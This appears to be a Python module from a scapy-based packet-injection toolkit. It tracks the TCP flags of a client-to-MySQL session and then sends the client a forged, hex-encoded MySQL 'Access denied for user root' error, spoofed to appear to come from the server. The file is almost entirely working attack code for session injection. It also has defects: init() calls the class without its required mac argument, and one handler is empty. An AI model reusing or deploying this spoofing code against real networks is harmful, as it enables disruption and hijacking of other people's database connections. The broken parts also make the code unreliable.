from scapy.all import *
from libs import packet as lpkt
from libs import injector
from libs import sniffer
from libs import logger

class mysql:
    events = None

    def detect_syn(self, pkt):
        self.events.syn = self.events.syn + 1
        if self.events.syn == 1:
            self.client_mac = pkt[Ether].src
        elif self.events.syn == 2:
            self.server_mac = pkt[Ether].src

    def detect_fin(self, pkt):
        self.events.ack = 0
        self.events.psh = 0
        self.events.syn = 0
        self.events.fin = self.events.fin + 1

    def detect_ack(self, pkt):
        self.events.ack = self.events.ack + 1

    def detect_psh(self, pkt):
        self.events.psh = self.events.psh + 1

    def send_error(self, pkt):
        error = lpkt.psh(pkt)
        error.load = "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29"
        lpkt.send(lpkt.ack(pkt))
        lpkt.send(Ether(src=sniffer.settings.mac,dst=self.client_mac)/lpkt.ack(error))
    
    def send_request(self, pkt):
        True

    def __init__(self, src, dst, mac):
        self.events = injector.Events(src, dst)
        self.client = src
        self.server = dst
        
        self.events.add('detect syn', self.detect_syn, [
            "pkt.flags == 'S'",
        ])
        self.events.add('detect fin', self.detect_fin, [
            "pkt.flags == 'F'",
        ])
        self.events.add('detect ack', self.detect_ack, [
            "pkt.flags == 'A'",
        ])
        self.events.add('detect psh', self.detect_psh, [
            "pkt.flags == 'P'",
        ])
        self.events.add('send error', self.send_error, [
            "syn == 2 && psh == 2 && ack == 5",
        ])
        self.events.add('send request', self.send_request, [
            "",
        ])

def init(src, dst):
    global mysql
    proto = mysql(src, dst)
    threading.Thread(target=proto.events.check_conditions).start()
    return proto;